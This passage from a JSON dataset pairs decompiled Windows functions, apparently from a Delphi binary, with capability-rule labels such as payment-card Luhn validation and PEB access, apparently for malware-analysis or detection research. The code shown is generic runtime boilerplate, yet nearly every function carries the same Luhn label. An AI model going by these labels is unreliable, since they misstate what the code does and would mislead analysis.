        "decompiled_code": "\nvoid __fastcall fcn.00418a1c(uint8_t *param_1, int32_t **param_2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    uint8_t uVar4;\n    int32_t *in_EAX;\n    uint32_t uVar5;\n    uint8_t *puVar6;\n    \n    piVar3 = param_2[2];\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar6 = (piVar3 & 0xffffff) + in_EAX;\n        uVar2 = *(**param_2 + 2 + *(**param_2 + 1));\n        uVar4 = *param_1;\n        if (uVar2 <= *param_1) {\n            uVar4 = uVar2;\n        }\n        *puVar6 = uVar4;\n        puVar1 = param_1 + 1;\n        for (uVar5 = uVar4; puVar6 = puVar6 + 1,  uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar6 = *puVar1;\n            puVar1 = puVar1 + 1;\n        }\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(piVar3 + *in_EAX))();\n        return;\n    }\n    (*piVar3)();\n    return;\n}\n",
        "token_count": 332
    },
    "00418a70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00418a70(void)\n\n{\n    fcn.004189d8(0xff);\n    fcn.0040482c();\n    return;\n}\n",
        "token_count": 37
    },
    "00418a98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00418a98(void)\n\n{\n    fcn.00404864();\n    fcn.00418a1c();\n    return;\n}\n",
        "token_count": 34
    },
    "00418ae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418ae0(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(param_2 + 7) == 0xff) {\n        fcn.00418acc();\n        return;\n    }\n    if (0xfd < *(param_2 + 7)) {\n        (**(*(param_2 + 4) + *in_EAX))();\n        return;\n    }\n    (**(param_2 + 4))();\n    return;\n}\n",
        "token_count": 115
    },
    "00418b20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418b20(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(param_2 + 0xb) == 0xff) {\n        fcn.00418acc();\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(*(param_2 + 8) + *in_EAX))();\n        return;\n    }\n    (**(param_2 + 8))();\n    return;\n}\n",
        "token_count": 117
    },
    "00418c7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418c7c(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    code *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x418d57;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    cVar1 = ***param_2;\n    if ((cVar1 == '\\x05') || (cVar1 == '\\n')) {\n        fcn.00418c10();\n        fcn.00404e20();\n    }\n    else if (cVar1 == '\\v') {\n        var_10h = param_2[1];\n        if ((var_10h & 0xff000000) == 0xff000000) {\n            puStack36 = &stack0xfffffffc;\n            fcn.00404d10();\n        }\n        else {\n            if ((var_10h & 0xff000000) == 0xfe000000) {\n                var_10h = *(*in_EAX + var_10h);\n            }\n            if (param_2[4] == -0x80000000) {\n                puStack36 = &stack0xfffffffc;\n                (*var_10h)();\n            }\n            else {\n                puStack36 = &stack0xfffffffc;\n                (*var_10h)();\n            }\n        }\n    }\n    else {\n        puStack36 = &stack0xfffffffc;\n        fcn.00404cd4();\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x418d5e;\n    uStack40 = 0x418d56;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 446
    },
    "00418d64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418d64(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    code *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x418e2b;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    cVar1 = ***param_2;\n    if ((cVar1 == '\\x05') || (cVar1 == '\\n')) {\n        fcn.00404850();\n        fcn.00418c50();\n    }\n    else if (cVar1 == '\\v') {\n        var_ch = param_2[2];\n        if ((var_ch & 0xff000000) == 0xff000000) {\n            puStack36 = &stack0xfffffffc;\n            fcn.00404d10();\n        }\n        else {\n            if ((var_ch & 0xff000000) == 0xfe000000) {\n                var_ch = *(*in_EAX + var_ch);\n            }\n            if (param_2[4] == -0x80000000) {\n                puStack36 = &stack0xfffffffc;\n                (*var_ch)();\n            }\n            else {\n                puStack36 = &stack0xfffffffc;\n                (*var_ch)();\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x418e32;\n    uStack40 = 0x418e2a;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 399
    },
    "00418e3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __fastcall fcn.00418e3c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uchar *puVar1;\n    char *pcVar2;\n    float10 *pfVar3;\n    float10 fStack28;\n    code *pcStack12;\n    \n    pcStack12 = *(param_2 + 4);\n    if ((pcStack12 & 0xff000000) == 0xff000000) {\n        pfVar3 = (pcStack12 & 0xffffff) + in_EAX;\n        puVar1 = fcn.00418374();\n    // switch table (5 cases) at 0x418e7d\n        switch(*puVar1) {\n        case 0:\n            fStack28 = *pfVar3;\n            break;\n        case 1:\n            fStack28 = *pfVar3;\n            break;\n        case 2:\n            fStack28 = *pfVar3;\n            break;\n        case 3:\n            fStack28 = *pfVar3;\n            break;\n        case 4:\n            fStack28 = *pfVar3 / *0x418f68;\n            break;\n        default:\n            fStack28 = fStack28 & 0;\n        }\n    }\n    else {\n        if ((pcStack12 & 0xff000000) == 0xfe000000) {\n            pcStack12 = *(*in_EAX + pcStack12);\n        }\n        if (*(param_2 + 0x10) == -0x80000000) {\n            fStack28 = (*pcStack12)();\n        }\n        else {\n            fStack28 = (*pcStack12)();\n        }\n        pcVar2 = fcn.00418374();\n        if (*pcVar2 == '\\x04') {\n            fStack28 = fStack28 / *0x418f68;\n        }\n    }\n    return fStack28;\n}\n",
        "token_count": 417
    },
    "0041918c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041918c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(param_2 + 7) == 0xff) {\n        fcn.00419178();\n        return;\n    }\n    if (0xfd < *(param_2 + 7)) {\n        (**(*(param_2 + 4) + *in_EAX))();\n        return;\n    }\n    (**(param_2 + 4))();\n    return;\n}\n",
        "token_count": 115
    },
    "004191cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004191cc(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(param_2 + 0xb) == 0xff) {\n        fcn.00419178();\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(*(param_2 + 8) + *in_EAX))();\n        return;\n    }\n    (**(param_2 + 8))();\n    return;\n}\n",
        "token_count": 116
    },
    "0041920c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041920c(uint *param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    \n    pcVar1 = *(param_2 + 8);\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar3 = in_EAX + (pcVar1 & 0xffffff);\n        uVar2 = param_1[1];\n        *puVar3 = *param_1;\n        puVar3[1] = uVar2;\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(pcVar1 + *in_EAX))();\n        return;\n    }\n    (*pcVar1)(*param_1, param_1[1]);\n    return;\n}\n",
        "token_count": 196
    },
    "00419244": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00419244(uint param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    \n    pcVar1 = *(param_2 + 4);\n    if (*(param_2 + 7) == 0xff) {\n        return *(in_EAX + (pcVar1 & 0xffffff));\n    }\n    if (0xfd < *(param_2 + 7)) {\n        uVar2 = (**(pcVar1 + *in_EAX))();\n        return uVar2;\n    }\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 150
    },
    "0041926c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041926c(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t *in_EAX;\n    uint *puVar2;\n    int32_t in_EDX;\n    \n    pcVar1 = *(in_EDX + 8);\n    if (*(in_EDX + 0xb) == 0xff) {\n        puVar2 = in_EAX + (pcVar1 & 0xffffff);\n        *puVar2 = arg_8h;\n        puVar2[1] = arg_ch;\n    }\n    else if (*(in_EDX + 0xb) < 0xfe) {\n        (*pcVar1)(arg_8h, arg_ch);\n    }\n    else {\n        (**(pcVar1 + *in_EAX))();\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "004192a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004192a8(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    code *pcStack16;\n    \n    pcStack16 = *(param_2 + 8);\n    if ((pcStack16 & 0xff000000) == 0xff000000) {\n        fcn.004062b0((pcStack16 & 0xffffff) + in_EAX);\n    }\n    else {\n        if ((pcStack16 & 0xff000000) == 0xfe000000) {\n            pcStack16 = *(*in_EAX + pcStack16);\n        }\n        if (*(param_2 + 0x10) == -0x80000000) {\n            (*pcStack16)();\n        }\n        else {\n            (*pcStack16)();\n        }\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "00419678": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.00419678(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uchar auStack16 [12];\n    \n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = auStack16;\n    *0x485848 = *0x485848 + 1;\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 83
    },
    "0041b1a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0041b1a0(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 0;\n    iVar4 = *(*(in_EAX + 0xc) + 8);\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar2 = fcn.0041c4c8();\n            cVar1 = fcn.00403a58();\n            if ((cVar1 != '\\0') && ((iVar3 == 0 || (cVar1 = fcn.00403a58(),  cVar1 != '\\0')))) {\n                iVar3 = iVar2;\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    return CONCAT44(param_2, iVar3);\n}\n",
        "token_count": 211
    },
    "0041b3d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041b3d0(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed4;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack284 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack288 = 0x41b46b;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack292;\n    fcn.00403770();\n    fcn.0040482c();\n    iVar1 = fcn.0041b32c();\n    if (iVar1 != 0) {\n        var_10ch = var_4h;\n        var_108h._0_1_ = 0xb;\n        in_stack_fffffed4 = 0;\n        fcn.0040c9d4(0, &var_10ch);\n        fcn.00403fc0();\n    }\n    fcn.0041c358();\n    *in_FS_OFFSET = in_stack_fffffed4;\n    uStack292 = 0x41b472;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 303
    },
    "0041b5a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041b5a0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.004037f0();\n    uVar1 = fcn.004037f0();\n    *(in_EAX + 4) = uVar1;\n    sub.kernel32.dll_InitializeCriticalSection_1();\n    iVar2 = fcn.0041b270();\n    fcn.0041c358();\n    *(iVar2 + 0x10) = 1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 222
    },
    "0041b6f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041b6f8(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_10ch;\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    var_10ch = 0;\n    uStack280 = 0x41b77b;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack284;\n    fcn.00403770();\n    var_8h = &var_108h;\n    var_4h._0_1_ = 4;\n    arg_ch = &var_8h;\n    arg_8h_00 = 0;\n    fcn.0040675c();\n    fcn.0040c918(arg_8h_00, arg_ch);\n    fcn.00403fc0();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack284 = 0x41b782;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 284
    },
    "0041b850": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041b850(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection_1(in_EAX + 8);\n    return;\n}\n",
        "token_count": 41
    },
    "0041b908": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041b908(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection_1(in_EAX + 8);\n    return;\n}\n",
        "token_count": 42
    },
    "0041bb54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041bb54(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x41bbb4;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_8h;\n    arg_8h = 0;\n    fcn.0040675c();\n    fcn.0040c918(arg_8h, arg_ch);\n    fcn.00403fc0();\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x41bbbb;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 228
    },
    "0041be44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041be44(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00403b58();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 8) = arg_ch;\n    *(in_EAX + 0xc) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack20;\n    }\n    return;\n}\n",
        "token_count": 189
    },
    "0041bf24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041bf24(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    uint *in_EDX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if (-1 < arg_8h) {\n        arg_8h = arg_8h + 1;\n        iVar2 = in_ECX + 4;\n        do {\n            cVar1 = fcn.004089f4();\n            if (cVar1 != '\\0') {\n                *in_EDX = *(iVar2 + -4);\n                return 1;\n            }\n            iVar2 = iVar2 + 8;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 183
    },
    "0041bf64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041bf64(int32_t arg_8h)\n\n{\n    uint32_t in_EAX;\n    uint32_t *in_ECX;\n    uint8_t var_5h;\n    uint var_4h;\n    \n    if (-1 < arg_8h) {\n        arg_8h = arg_8h + 1;\n        do {\n            if (in_EAX == *in_ECX) {\n                var_5h = 1;\n                in_EAX = fcn.0040461c();\n                goto code_r0x0041bf9b;\n            }\n            in_ECX = in_ECX + 2;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    var_5h = 0;\ncode_r0x0041bf9b:\n    return in_EAX & 0xffffff00 | var_5h;\n}\n",
        "token_count": 209
    },
    "0041c1cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c1cc(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    uStack280 = 0x41c262;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee4;\n    if ((in_EAX != *0x41ac44) && (in_EAX != *(arg_8h + -8))) {\n        fcn.004037ac();\n        fcn.0041c1cc(arg_8h);\n        fcn.00403770();\n        fcn.0040482c();\n        fcn.00405bd0(0);\n        fcn.00405c20();\n        fcn.0041c064();\n    }\n    *in_FS_OFFSET = uStack284;\n    puStack276 = 0x41c269;\n    uStack280 = 0x41c261;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 263
    },
    "0041c40c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c40c(uint param_1, uint param_2)\n\n{\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar auStack16 [4];\n    uchar uStack12;\n    \n    fcn.0041c408();\n    uStack12 = 0;\n    uStack52 = 0;\n    iStack48 = fcn.0040c918(0, auStack16);\n    if (iStack48 == 0) {\n        iStack48 = fcn.004045bc();\n    }\n    uStack44 = param_2;\n    // WARNING: Could not recover jumptable at 0x00403fe1. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x485014)(0xeedfade, 1, 7, &uStack52);\n    return;\n}\n",
        "token_count": 197
    },
    "0041c758": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041c758(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.004037f0();\n    sub.kernel32.dll_InitializeCriticalSection_1();\n    uVar1 = fcn.004037f0();\n    *(in_EAX + 4) = uVar1;\n    *(in_EAX + 0x20) = 0;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 193
    },
    "0041c7ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041c7ac(void)\n\n{\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    int32_t iStack20;\n    uchar *puStack16;\n    int32_t var_5h;\n    \n    puStack16 = 0x41c7b7;\n    *NULL = fcn.00403bc0();\n    puStack16 = 0x41c7c5;\n    var_5h._0_1_ = extraout_DL;\n    fcn.0041c8b0();\n    iStack20 = 0x41c80e;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00403820();\n    fcn.00403810();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41c815;\n    iStack20 = 0x41c801;\n    fcn.0041c914();\n    iStack20 = stack0xfffffff8 + 8;\n    uStack24 = 0x41c80d;\n    sub.kernel32.dll_DeleteCriticalSection_1();\n    return;\n}\n",
        "token_count": 280
    },
    "0041c914": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041c914(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection_1(in_EAX + 8);\n    return;\n}\n",
        "token_count": 42
    },
    "0041cafc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041cafc(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_114h;\n    uint var_110h;\n    uint *var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack296 = 0x41cbb2;\n    uStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack300;\n    if (param_2 == 0) {\n        fcn.00404660();\n    }\n    else {\n        puStack292 = &stack0xfffffffc;\n        fcn.00403770();\n        fcn.0040482c();\n    }\n    var_114h = var_4h;\n    var_110h._0_1_ = 0xb;\n    fcn.00403770();\n    var_10ch = &var_104h;\n    var_108h._0_1_ = 4;\n    uVar1 = 1;\n    fcn.0040c9d4(1, &var_114h);\n    fcn.00403fc0();\n    *in_FS_OFFSET = uVar1;\n    uStack300 = 0x41cbb9;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 350
    },
    "0041ceec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041ceec(void)\n\n{\n    fcn.00403770();\n    fcn.0040482c();\n    return;\n}\n",
        "token_count": 33
    },
    "0041d02c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041d02c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 4) = param_1;\n    uVar1 = fcn.004037f0();\n    *(in_EAX + 8) = uVar1;\n    fcn.0041cde4();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 201
    },
    "0041d530": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041d530(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00403b58();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 0x18) = in_ECX;\n    fcn.0041d02c();\n    if (in_DL != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 173
    },
    "0041d5f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d5f0(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41d697;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x41d61a;\n    fcn.0041d740();\n    uStack48 = 0x41d67a;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    iVar1 = (**(*param_2 + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*param_2 + 0xc))();\n            (**(*param_2 + 0x18))(0);\n            (**(*in_EAX + 0x3c))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x41d681;\n    uStack48 = 0x41d679;\n    fcn.0041d7fc();\n    return;\n}\n",
        "token_count": 363
    },
    "0041d7b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d7b0(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = fcn.0041e238;\n    fcn.0041d758(&stack0xfffffffc);\n    (**(*param_2 + 4))(pcVar1);\n    return;\n}\n",
        "token_count": 94
    },
    "0041d810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
